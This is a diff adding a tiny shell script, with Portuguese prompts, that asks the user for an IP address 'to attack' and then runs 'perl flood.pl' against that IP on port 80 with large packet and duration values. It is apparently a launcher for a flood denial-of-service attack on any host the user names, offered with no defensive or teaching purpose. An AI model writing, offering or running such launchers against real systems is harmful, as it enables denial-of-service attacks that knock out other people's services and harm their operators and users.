@@ -1,0 +1,6 @@
+#!/bin/sh
+
+echo -e "Digite o ip que deseja atacar"
+read -p ": " ip
+
+perl flood.pl $ip 80 65500 800
